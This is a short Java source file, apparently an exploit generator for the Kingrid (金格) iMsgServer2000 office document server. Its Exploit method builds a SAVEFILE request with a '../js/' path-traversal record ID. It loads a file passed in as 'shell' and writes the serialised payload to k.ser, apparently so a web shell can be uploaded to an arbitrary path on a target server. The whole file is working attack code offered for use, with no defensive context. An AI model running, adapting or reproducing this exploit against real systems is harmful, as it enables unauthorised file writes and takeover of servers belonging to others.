package com.sorry.utils.custom;

import DBstep.iMsgServer2000;
import com.sorry.utils.bytecommon.TransforBytes;

import java.io.IOException;

/**
 * created by 0x22cb7139 on 2021/6/16
 */
//金格
public class OfficeServer {


    public static void main(String[] args) throws IOException {
        TransforBytes.CreateFileFromBytes(Exploit("k.txt"),"k.ser");
    }


    public static byte[] Exploit(String shell) {
        iMsgServer2000 imsg = new iMsgServer2000();
        imsg.SetMsgByName("DBSTEP", "DBSTEP");
        imsg.SetMsgByName("OPTION", "SAVEFILE");
        imsg.SetMsgByName("USERNAME", "USERNAME");
        imsg.SetMsgByName("RECORDID", "../js/");
        imsg.SetMsgByName("FILETYPE", "r.txt");
        imsg.MsgFileLoad(shell);
        return imsg.MsgVariant();
    }

}
